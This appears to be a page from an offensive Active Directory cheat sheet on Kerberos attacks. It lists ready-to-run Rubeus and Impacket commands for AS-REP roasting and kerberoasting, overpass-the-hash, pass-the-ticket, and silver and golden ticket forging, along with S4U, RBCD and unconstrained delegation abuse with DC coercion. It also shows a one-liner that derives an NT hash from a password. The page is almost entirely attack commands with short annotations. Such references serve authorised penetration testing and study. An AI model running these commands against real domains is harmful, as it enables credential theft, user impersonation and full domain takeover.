# Kerberos tickets and delegation

[← Active Directory quick reference](../05-active-directory.md)

## Rubeus (from a Windows shell: roasting, tickets, PtT)
```powershell
# web01 (domain-joined shell)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
.\Rubeus.exe kerberoast /outfile:kerb.txt              # add /tgtdeleg to roast with the current TGT
.\Rubeus.exe asktgt /user:svc /rc4:<NThash> /ptt       # overpass-the-hash -> inject a TGT
.\Rubeus.exe asktgt /user:svc /aes256:<key> /ptt       # AES variant if RC4 is disabled
.\Rubeus.exe ptt /ticket:<base64|kirbi>                # pass-the-ticket (inject a stolen ticket)
.\Rubeus.exe s4u /user:svc$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target /ptt
.\Rubeus.exe triage                                    # list tickets in memory  (dump /nowrap to extract)
```
Crack with Hashcat modes `13100` (TGS) / `18200` (AS-REP).

## Ticket forging: Silver vs Golden (know which hash forges what)
Ticket use:
- **NT hash** = `MD4(UTF-16LE(password))`. This *is* "the NTLM hash" people mean for PtH/ticketer.
- **NetNTLMv2** = the challenge-response blob (Responder/coercion). **Cannot be passed**: you *crack* it to get the password, then derive the NT hash.
```bash
# NT hash from a cleartext password you cracked:
python3 -c 'import hashlib;print(hashlib.new("md4","P@ssw0rd!".encode("utf-16le")).hexdigest())'
```
Forge by available key material:

```powershell
setspn.exe -Q MSSQLSvc/sql01.corp.local:1433
```

```bash
# SILVER ticket: service account's NT hash + domain SID + SPN.
#   Forges a TGS for THAT ONE service only, as any user (e.g. administrator).
impacket-ticketer -nthash <svc_NT> -domain-sid <SID> -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 administrator
export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k sql01.corp.local        # inspect role and use manual T-SQL if applicable

# GOLDEN ticket: krbtgt NT hash (or AES key) + domain SID. Forges a TGT for ANYONE, anywhere.
#   Needs krbtgt -> you must already be DCSync-capable / on the DC. A service acct hash will NOT do this.
impacket-ticketer -nthash <krbtgt_NT> -domain-sid <SID> -domain corp.local administrator
```
> Silver: confirm SPN ↔ account; use `-aesKey <aes256>` when AES is required. Golden: needs `krbtgt` key.

## Delegation
```bash
# Constrained (TRUSTED_TO_AUTH_FOR_DELEGATION): impersonate via S4U
impacket-getST -spn cifs/target -impersonate administrator 'dom/svc:pass'
# RBCD (you have GenericWrite on a computer object): set msDS-AllowedToActOnBehalfOfOtherIdentity
#   then impacket-getST -spn ... -impersonate administrator. Tools: rubeus s4u.
# Unconstrained: coerce a DC auth (printerbug/PetitPotam) then grab its TGT. Note scope before sinking time.
```
